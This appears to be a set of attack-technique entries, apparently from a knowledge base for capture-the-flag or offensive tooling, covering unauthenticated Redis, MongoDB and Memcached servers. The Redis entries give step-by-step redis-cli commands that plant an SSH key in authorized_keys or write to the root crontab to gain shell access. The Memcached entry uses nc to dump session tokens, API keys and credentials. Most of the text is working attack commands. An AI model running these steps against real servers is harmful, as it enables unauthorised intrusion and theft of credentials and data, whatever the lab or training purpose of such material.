title: Redis Unauthorized Access — SSH Key / Crontab Exploitation
description: When Redis is accessible without authentication (AuthBypass), an attacker can abuse the CONFIG SET command to write arbitrary files to disk. Two common techniques: (1) Write an SSH public key to ~/.ssh/authorized_keys for passwordless SSH access. (2) Write a reverse shell to /etc/crontab or /var/spool/cron/crontabs/. The write path depends on the Redis server's filesystem permissions and the target user's home directory.
techniques: redis-cli -h TARGET -p PORT CONFIG SET dir /home/victim/.ssh/
redis-cli -h TARGET -p PORT CONFIG SET dbfilename authorized_keys

redis-cli -h TARGET -p PORT SET key '

ssh-rsa AAA...

'
redis-cli -h TARGET -p PORT CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h TARGET -p PORT CONFIG SET dbfilename root
First test connection: redis-cli -h TARGET -p PORT PING
Check current config: redis-cli -h TARGET -p PORT CONFIG GET dir
Also try reading files via GET if keys contain sensitive data: redis-cli -h TARGET -p PORT KEYS '*' then GET each key

title: Redis Unauthorized → SSH Key Generation and Injection
description:
Step-by-step Redis AuthBypass → SSH: (0) Clean old keys: rm -f /tmp/redis_key /tmp/redis_key.pub (1) Generate SSH key pair: ssh-keygen -t rsa -f /tmp/redis_key -N '' -q (2) Read the public key: cat /tmp/redis_key.pub (3) Connect to Redis: redis-cli -h TARGET -p PORT (4) Flush existing data: FLUSHALL (5) Set the key with SSH public key wrapped in newlines: SET mykey '

<PUBLIC_KEY_CONTENT>

' (6) Set Redis working directory: CONFIG SET dir /home/victim/.ssh/ (7) Set DB filename: CONFIG SET dbfilename authorized_keys (8) Save to disk: SAVE (9) SSH in: ssh -i /tmp/redis_key victim@TARGET (10) Read flag: cat /flag.txt or cat /home/victim/flag.txt
techniques:
redis-cli -h TARGET -p PORT SET mykey '

ssh-rsa AAAA...

'
redis-cli -h TARGET -p PORT CONFIG SET dir /home/victim/.ssh/
redis-cli -h TARGET -p PORT CONFIG SET dbfilename authorized_keys

title: MongoDB Unauthorized Access Exploitation
description: MongoDB without authentication allows reading all databases and collections. Use mongo shell to connect, list databases (show dbs), switch to each (use dbname), list collections (show collections), and dump data (db.collection.find()). Look for credentials, tokens, or flag values in document fields.

title: Memcached Unauthorized Access — Data Dump
description: Memcached without authentication allows dumping all cached data including session tokens, API keys, and database credentials. Use telnet or nc to connect, run 'stats items' to list slabs, then 'stats cachedump SLAB_ID LIMIT' to dump keys and values.
techniques: echo 'stats cachedump SLAB_ID 100' | nc TARGET PORT
